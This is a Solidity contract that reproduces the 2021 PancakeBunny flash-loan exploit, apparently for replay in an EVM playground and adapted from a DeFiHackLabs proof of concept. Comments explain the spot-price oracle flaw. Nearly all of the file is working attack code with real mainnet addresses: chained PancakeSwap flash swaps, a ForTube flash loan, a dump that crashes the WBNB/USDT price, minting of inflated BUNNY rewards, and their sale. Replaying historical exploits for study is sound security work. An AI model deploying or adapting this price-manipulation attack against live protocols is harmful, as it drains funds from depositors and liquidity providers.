// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

// Synthetic standalone exploit for the EVM Playground (2021-05-PancakeBunny).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// (the flash-swap callback `pancakeCall` and the ForTube callback
// `executeOperation` live on the test itself, so there is no standalone
// contract to deploy). This contract is a faithful, self-contained copy of
// that inline attack (testExploit body → deposit()+run(); trigger();
// pancakeCall(); executeOperation(); exploit()) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/PancakeBunny_exp.sol. No imports — it compiles anywhere.
//
// Root cause: PancakeBunny's reward valuation reads an LP's BNB/USD value from
// PancakeSwap SPOT reserves (PriceCalculator.valueOfAsset → pair.getReserves()).
// A flash-loan-funded dump of WBNB into the WBNB/USDT v1 pair collapses that
// spot price, so getReward() mints ~6.95M BUNNY against an $882M phantom
// valuation; the BUNNY is then dumped for ~2.38M WBNB in the same transaction.
//
// Replay note: the recorder runs the whole exploit at one block number, but
// farming rewards only accrue across blocks. The recorder's setup therefore:
//   1. funds this contract with 1 BNB (fundAttackerWei → the deployer),
//   2. calls deposit() to become an earning vault depositor,
//   3. advances MasterChef pool 264's accCakePerShare (storeSlot) so the
//      reward accrued since deposit is non-zero,
//   4. calls harvest() pranked as the keeper (rawCall caller),
// then records run() — the flash-loan manipulation itself.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IVaultFlipToFlip {
    function deposit(uint256 _amount) external;
    function earned(address account) external view returns (uint256);
    function getReward() external;
    function harvest() external;
}

interface IBunnyZap {
    function zapInToken(address _from, uint256 amount, address _to) external;
}

interface IPancakeRouter {
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        external
        pure
        returns (uint256 amountOut);
}

interface IFortubeBank {
    function flashloan(address receiver, address token, uint256 amount, bytes memory params) external;
    function controller() external returns (address);
}

interface IWBNB {
    function deposit() external payable;
}

contract PancakeBunnyDrain {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant BUNNY = 0xC9849E6fdB743d08fAeE3E34dd2D1bc69EA11a51;

    IVaultFlipToFlip constant flip = IVaultFlipToFlip(0x633e538EcF0bee1a18c2EDFE10C4Da0d6E71e77B);
    IBunnyZap constant zap = IBunnyZap(0xdC2bBB0D33E0e7Dea9F5b98F46EDBaC823586a0C);
    IPancakeRouter constant router = IPancakeRouter(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
    IFortubeBank constant FortubeBank = IFortubeBank(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);

    IUniPairV2 constant WBNBUSDTv1 = IUniPairV2(0x20bCC3b8a0091dDac2d0BC30F68E6CBb97de59Cd);
    IUniPairV2 constant WBNBUSDTv2 = IUniPairV2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IUniPairV2 constant WBNBBUNNY = IUniPairV2(0x7Bb89460599Dbf32ee3Aa50798BBcEae2A5F7f6a);

    // 7 PancakeSwap flash-swap pairs (WBNB side), chained via pancakeCall.
    IUniPairV2[7] pairs = [
        IUniPairV2(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0), // WBNB/CAKE
        IUniPairV2(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16), // WBNB/BUSD
        IUniPairV2(0x74E4716E431f45807DCF19f284c7aA99F18a4fbc), // WBNB/ETH
        IUniPairV2(0x61EB789d75A95CAa3fF50ed7E47b96c132fEc082), // WBNB/BTC
        IUniPairV2(0x9adc6Fb78CEFA07E13E9294F150C1E8C1Dd566c0), // WBNB/SAFEMOON
        IUniPairV2(0xF3Bc6FC080ffCC30d93dF48BFA2aA14b869554bb), // WBNB/BELT
        IUniPairV2(0xDd5bAd8f8b360d76d12FdA230F8BAF42fe0022CF) // WBNB/DOT
    ];

    // Becomes an earning vault depositor. Called in setup (unrecorded) with 1 BNB
    // of call value: wrap to WBNB, zap into the WBNB/USDT v2 LP, deposit to vault.
    function deposit() external payable {
        IWBNB(WBNB).deposit{value: 1e18}();
        IERC20(WBNB).approve(address(zap), 1e18);
        IERC20(address(WBNBUSDTv2)).approve(address(flip), type(uint256).max);
        IERC20(address(USDT)).approve(address(router), type(uint256).max);
        IERC20(address(WBNB)).approve(address(router), type(uint256).max);

        zap.zapInToken(WBNB, 1e18, address(WBNBUSDTv2));
        uint256 lpamount = IERC20(address(WBNBUSDTv2)).balanceOf(address(this));
        flip.deposit(lpamount);
    }

    // Single recorded entrypoint: the flash-loan price manipulation + dump.
    // Assumes deposit() + harvest() (as keeper) already ran in setup.
    function run() external payable {
        trigger();
    }

    function trigger() public {
        require(flip.earned(address(this)) > 0, "Nothing earned.");

        // Initiate the first flash swap; pancakeCall chains the rest.
        (uint256 amount0, uint256 amount1,) = pairs[0].getReserves();
        if (WBNB == pairs[0].token1()) {
            pairs[0].swap(0, amount1 - 1, address(this), abi.encode(uint256(0), uint256(1)));
        } else {
            pairs[0].swap(amount0 - 1, 0, address(this), abi.encode(uint256(0), uint256(0)));
        }
    }

    function pancakeCall(address, uint256 amount0, uint256 amount1, bytes calldata data) public {
        (uint256 level, uint256 asset) = abi.decode(data, (uint256, uint256));

        // Chain the next 6 WBNB flash swaps from PancakeSwap pairs.
        if (level + 1 < 7) {
            level++;
            (uint256 _amount0, uint256 _amount1,) = pairs[level].getReserves();
            if (WBNB == pairs[level].token1()) {
                pairs[level].swap(0, _amount1 - 1, address(this), abi.encode(level, uint256(1)));
            } else {
                pairs[level].swap(_amount0 - 1, 0, address(this), abi.encode(level, uint256(0)));
            }
        } else {
            // 7th flash swap: borrow 2,961,750 USDT from ForTube Bank.
            uint256 usdtFlashloanAmount = 2_961_750_450_987_026_369_366_661;
            FortubeBank.flashloan(address(this), USDT, usdtFlashloanAmount, hex"");
            // execution passes to executeOperation()
        }

        // Repay each PCS flash swap with the 0.25% fee.
        uint256 retAmount = asset == 0 ? ((amount0 * 10_000) / 9975 + 1) : ((amount1 * 10_000) / 9975 + 1);
        require(IERC20(WBNB).balanceOf(address(this)) >= retAmount, "not making proift");
        IERC20(WBNB).transfer(msg.sender, retAmount);
    }

    function executeOperation(address, uint256 amount, uint256 fee, bytes calldata) public {
        exploit();

        // Repay the ForTube flash loan.
        uint256 usdtOwed = amount + fee;
        IERC20(USDT).transfer(FortubeBank.controller(), usdtOwed);
    }

    function exploit() public {
        uint256 wbnbAmount = IERC20(WBNB).balanceOf(address(this)) - 15_000e18;

        // Re-zap 15,000 WBNB into the vault LP + donate it to the pair (inflates the
        // reward LP whose value the oracle will read).
        IERC20(WBNB).approve(address(zap), type(uint256).max);
        zap.zapInToken(WBNB, 15_000e18, address(WBNBUSDTv2));
        uint256 attackerLPBalance = IERC20(address(WBNBUSDTv2)).balanceOf(address(this));
        IERC20(address(WBNBUSDTv2)).transfer(address(WBNBUSDTv2), attackerLPBalance);

        // Manipulate the WBNB/USDT v1 spot price: dump (nearly) all WBNB for USDT.
        (uint256 reserve0, uint256 reserve1,) = WBNBUSDTv1.getReserves();
        uint256 amountOut = router.getAmountOut(wbnbAmount, reserve1, reserve0);
        IERC20(WBNB).transfer(address(WBNBUSDTv1), wbnbAmount);
        WBNBUSDTv1.swap(amountOut, 0, address(this), hex"");

        // Collect the inflated BUNNY reward (priced off the now-broken oracle).
        flip.getReward();

        // Dump the minted BUNNY for WBNB on the WBNB/BUNNY pair.
        {
            uint256 bunnyBalance = IERC20(BUNNY).balanceOf(address(this)) - 1;
            (uint256 r0, uint256 r1,) = WBNBBUNNY.getReserves();
            uint256 out = router.getAmountOut(bunnyBalance, r1, r0);
            IERC20(BUNNY).transfer(address(WBNBBUNNY), bunnyBalance);
            WBNBBUNNY.swap(out, 0, address(this), hex"");
        }
    }

    receive() external payable {}
}
